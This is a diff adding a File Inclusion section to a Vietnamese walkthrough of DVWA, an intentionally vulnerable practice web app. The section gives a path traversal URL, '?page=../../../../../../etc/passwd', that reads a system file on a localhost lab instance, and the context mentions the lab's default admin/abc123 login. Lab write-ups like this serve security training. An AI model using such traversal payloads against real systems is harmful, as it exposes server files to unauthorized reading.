@@ -36,6 +36,16 @@ Kiem tra lai tai khoan **admin** voi mat khau **abc123**
 ![CSRF_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/CSRF_2.png)
 ## 4. File Inclusion  
 
+```
+http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file1.php
+http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file2.php
+http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file3.php
+```  
+Duong dan **/?page=** se tro den 1 file tren server, vi vay ta co the thu truy cap toi cac file khac tren server (vi du /etc/passwd) bang cach the, **../** vao URL nhu sau:
+```
+http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
+```  
+![File Inclusion_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/File%20Inclusion_1.png)  
 ## 5. File Upload  
 
 ## 6. Insecure Captcha  
